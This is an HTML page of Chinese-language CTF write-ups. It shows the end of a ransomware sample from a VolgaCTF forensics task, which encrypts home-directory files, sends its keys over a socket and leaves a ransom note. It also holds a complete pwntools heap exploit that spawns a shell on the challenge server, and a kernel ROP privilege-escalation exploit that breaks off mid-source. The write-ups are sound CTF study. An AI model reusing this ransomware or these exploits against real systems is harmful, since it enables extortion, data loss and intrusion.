O</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;darwin&quot;</span> <span class="keyword">in</span> z:</span><br><span class="line">            Q.platform = N</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;win32&quot;</span> <span class="keyword">in</span> z:</span><br><span class="line">            Q.platform = G</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = L(<span class="string">&#x27;/tmp/.X11.&#x27;</span> + Q.<span class="built_in">id</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            Q.inf = B</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            f = L(<span class="string">&#x27;/tmp/.X11.&#x27;</span> + Q.<span class="built_in">id</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            Q.inf = R</span><br><span class="line">            f.write(Q.<span class="built_in">id</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">Q, c, fl</span>):</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        J = os.walk</span><br><span class="line">        T = os.remove</span><br><span class="line">        S = os.environ</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = L(fl, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">            d = f.read()</span><br><span class="line">            f.close()</span><br><span class="line">            d = x(d)</span><br><span class="line">            q = c.encrypt(d)</span><br><span class="line">            f = L(fl + <span class="string">&#x27;.enc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            f.write(q)</span><br><span class="line">            f.close()</span><br><span class="line">            T(fl)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">Q</span>):</span><br><span class="line">        <span class="keyword">import</span> socket</span><br><span class="line">        <span class="keyword">import</span> random</span><br><span class="line">        <span class="keyword">import</span> base64</span><br><span class="line">        M = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> o(<span class="number">16</span>):</span><br><span class="line">            p = <span class="string">&#x27;&#x27;</span>.join(random.choices(C, k=<span class="number">16</span>))</span><br><span class="line">            M.append(p)</span><br><span class="line">        u = <span class="string">&#x27;,&#x27;</span>.join(k <span class="keyword">for</span> k <span class="keyword">in</span> M)</span><br><span class="line">        u = W(u, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        u = base64.b64encode(u)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect(g)</span><br><span class="line">        s.sendall(W(Q.<span class="built_in">id</span>, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        s.recv(<span class="number">1</span>)</span><br><span class="line">        s.sendall(u)</span><br><span class="line">        <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">        c = AES.new(p, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">for</span>(dirpath, dirnames, filenames)<span class="keyword">in</span> J(Q.home):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;.ssh&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> dirnames:</span><br><span class="line">                <span class="keyword">for</span> fn <span class="keyword">in</span> filenames:</span><br><span class="line">                    <span class="keyword">for</span> e <span class="keyword">in</span> U:</span><br><span class="line">                        <span class="keyword">if</span> fn.endswith(e):</span><br><span class="line">                            Q.r(c, dirpath + <span class="string">&#x27;/&#x27;</span> + fn)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">        f = L(Q.home + <span class="string">&#x27;/message&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        f.write(W(<span class="string">&#x27;All your files was encrypted\n. Contact Ywe23z3565yrgbv@protonmail.com for information(mention IP address on theme)\n&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">k = V()</span><br><span class="line"><span class="keyword">if</span> k.platform != O:</span><br><span class="line">    l(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> k.inf:</span><br><span class="line">    l(<span class="number">0</span>)</span><br><span class="line">k.t()</span><br></pre></td></tr></table></figure>
<p>使用AES 256bit的CBC_MODE加密,密钥组Base64发送给了<code>192.168.1.38, 9999</code><br>再次在Wireshark中添加Filter: <code>tcp.port ==9999 and tcp and ip.dst == 192.168.1.38</code><br>找到密钥组Base64:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bVRHZWxqaERSS0FTS0toUSxGTHJzU0V2ZVFRaWxvUFJuLFhlZFhIWUJVSHBJWERCSlAsSU9HUEVyam9zeE5pUXJOTSxSenZwYkVVUkxkRmZhR0ZNLHZkQlZEQ3ZpeGpTaENRdnksRVFsY3NuVXR6Q0h5RlBITSxKa0RpamdBRmlWQldKYUx6LGdoY1BJT1NxQ2RDVHFPcEQsRG5lQ3dia0RIa29qcHBIbSxsVlJaUmVBbGFJekhnaXNjLE5kamNnVlZqaWlueGZ0Q0MsUmtnTHBSQ3FybmlicnFzTixremV3dGVBZ1BFWmRrelFKLEhucEdvVWVxY2tFcXhwUW0sTFNOV1JhclRoUmRpUExwTQ==</span><br></pre></td></tr></table></figure>

<p>AES解密脚本得到flag,注意Python3的bytes和string有大坑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex,a2b_hex</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="comment"># flag&#123;26c08ad080830d6dcd76c15009ab6b03&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_ecb</span>(<span class="params">m,key</span>):</span><br><span class="line">    cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    c = cipher.decrypt(m)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">k = <span class="string">&quot;bVRHZWxqaERSS0FTS0toUSxGTHJzU0V2ZVFRaWxvUFJuLFhlZFhIWUJVSHBJWERCSlAsSU9HUEVyam9zeE5pUXJOTSxSenZwYkVVUkxkRmZhR0ZNLHZkQlZEQ3ZpeGpTaENRdnksRVFsY3NuVXR6Q0h5RlBITSxKa0RpamdBRmlWQldKYUx6LGdoY1BJT1NxQ2RDVHFPcEQsRG5lQ3dia0RIa29qcHBIbSxsVlJaUmVBbGFJekhnaXNjLE5kamNnVlZqaWlueGZ0Q0MsUmtnTHBSQ3FybmlicnFzTixremV3dGVBZ1BFWmRrelFKLEhucEdvVWVxY2tFcXhwUW0sTFNOV1JhclRoUmRpUExwTQ==&quot;</span></span><br><span class="line">k = base64.b64decode(k).decode()</span><br><span class="line">k = k.replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">key = k[-<span class="number">16</span>:].encode()</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">open</span>(<span class="string">&#x27;./secrets.txt.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">res = aes_encrypt_ecb(d,key)</span><br><span class="line"><span class="built_in">print</span>(res.decode())</span><br></pre></td></tr></table></figure>

<h2 id="notepad-pwn"><a href="#notepad-pwn" class="headerlink" title="notepad-pwn"></a>notepad-pwn</h2><p>简单的Tcache,题目中有太多overflow的地方…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># VolgaCTF&#123;i5_g1ibc_mall0c_irr3p@rable?&#125;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&#x27;notepad.q.2020.volgactf.ru&#x27;</span>, <span class="number">45678</span></span><br><span class="line">p = remote(HOST,PORT)</span><br><span class="line"><span class="comment"># p = process(&#x27;./notepad&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./notepad&#x27;</span>)</span><br><span class="line">l = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">name</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pick_note</span>(<span class="params">idx</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_note</span>(<span class="params">idx</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_note</span>():</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_tab</span>(<span class="params">name,size,data</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,name)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    s(<span class="string">&#x27;: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_tab</span>(<span class="params">idx</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_tab</span>(<span class="params">idx,name,size,data</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;update: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(<span class="string">&quot;: &quot;</span>,name)</span><br><span class="line">    sl(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    s(<span class="string">&quot;: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_tab</span>(<span class="params">idx</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_tab</span>():</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit_tab</span>():</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaking libc</span></span><br><span class="line">add_note(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">pick_note(<span class="number">1</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>,<span class="number">0x418</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x408</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;2&#x27;</span>*<span class="number">0x8</span>,<span class="number">0x68</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;3&#x27;</span>*<span class="number">0x8</span>,<span class="number">0x88</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">dele_tab(<span class="number">2</span>)</span><br><span class="line">dele_tab(<span class="number">1</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;4&#x27;</span>*<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">view_tab(<span class="number">2</span>)</span><br><span class="line">l.address = u64(p.recv(<span class="number">8</span>))-<span class="number">0x3ec00a</span></span><br><span class="line">log.info(<span class="string">&#x27;l.address:&#x27;</span>+<span class="built_in">hex</span>(l.address))</span><br><span class="line">__free_hook = l.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;__free_hook:&#x27;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line">system = l.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">quit_tab()</span><br><span class="line"><span class="comment"># overflow</span></span><br><span class="line">add_note(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line">add_note(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add_note(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">pick_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack __free_hook</span></span><br><span class="line">add_tab(p64(<span class="number">0</span>)+p64(<span class="number">0x8</span>),__free_hook,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">quit_tab()</span><br><span class="line">pick_note(<span class="number">3</span>)</span><br><span class="line">update_tab(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">quit_tab()</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">pick_note(<span class="number">4</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">dele_tab(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/03/30/2020volgactf/" data-id="cuid94yNSkA8AQrav2ibZ1WMe" data-title="VolgaCTF 2020" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2020新春抗疫ctfbabyhacker" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/03/02/2020%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%ABctfbabyhacker/" class="article-date">
  <time class="dt-published" datetime="2020-03-02T03:07:10.000Z" itemprop="datePublished">2020-03-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/03/02/2020%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%ABctfbabyhacker/">2020-新春抗疫</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="2020-新春抗疫-babyhacker"><a href="#2020-新春抗疫-babyhacker" class="headerlink" title="2020-新春抗疫-babyhacker"></a>2020-新春抗疫-babyhacker</h2><p>一道裸kernel rop题目,比赛时initramfs.cpio中存放着真flag造成非预期</p>
<p>赛后补题目</p>
<h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>kernel的qemu启动脚本,题目的时间限制比较死</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stty intr ^]</span></span><br><span class="line"><span class="comment"># cd `dirname $0`</span></span><br><span class="line"><span class="built_in">timeout</span> --foreground 15 qemu-system-x86_64 \</span><br><span class="line">  -m 512M \</span><br><span class="line">  -nographic \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -initrd initramfs.cpio \</span><br><span class="line">  -smp cores=2,threads=4 \</span><br><span class="line">  -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>  下面是<code>/etc/init.d/rcS</code>内核启动脚本:</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/babyhacker.ko</span><br><span class="line"><span class="built_in">chmod</span> 644 /dev/babyhacker</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/pwn</span><br><span class="line"><span class="built_in">chown</span> -R root /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R 1000:1000 .</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<h2 id="vulnerable"><a href="#vulnerable" class="headerlink" title="vulnerable"></a>vulnerable</h2><p>  在babyhacker.ko中存在一个明显的integer overflow (symbol overflow)</p>
  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyhacker_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__int64 v3; <span class="comment">// rbp</span></span><br><span class="line">file *rdx1; <span class="comment">// rdx</span></span><br><span class="line">__int16 v5; <span class="comment">// di</span></span><br><span class="line"><span class="type">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h]</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">__int64 v9; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">_fentry__(file, cmd, arg);</span><br><span class="line">v9 = v3;</span><br><span class="line">v5 = (__int16)rdx1;</span><br><span class="line">v8 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line"><span class="keyword">switch</span> ( cmd )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x30001u</span>:</span><br><span class="line">    <span class="built_in">babyhacker_ioctl_0</span>(rdx1, <span class="number">0x30001u</span>, (<span class="type">unsigned</span> __int64)rdx1);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x30002u</span>:</span><br><span class="line">    <span class="built_in">copy_to_user</span>(rdx1, v4, buffersize);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x30000u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)rdx1 &gt;= <span class="number">11</span> )                    <span class="comment">// integer overflow</span></span><br><span class="line">      v5 = <span class="number">10</span>;</span><br><span class="line">    buffersize = v5;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>  漏洞利用思路如下:</p>
<ol>
<li>输入负数绕过<code>ioctl(0x30000)</code>判断,赋值给<code>(uint16_t *)buffersize</code>一个越界大小,例如0x180</li>
<li>通过<code>ioctl(0x300002)</code>打印内核栈空间,泄露kernelbase地址和canary</li>
<li>使用<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 从bzImage中提取vmlinux寻找gadget打rop</li>
<li>最后调用<code>ioctl(0x300001)</code>栈溢出做KernelROP</li>
</ol>
<p>  注:<br>  内核开启了KASLR和SMEP,可以通过<code>mov cr4,0x6f0</code>bypass smep后ret2user,<br>  执行<code>commit_creds(prepare_kernel_cred(0))</code>提权,最后<code>iretq</code>到user space起shell.</p>
  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;error.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">uint64_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initfd</span><span 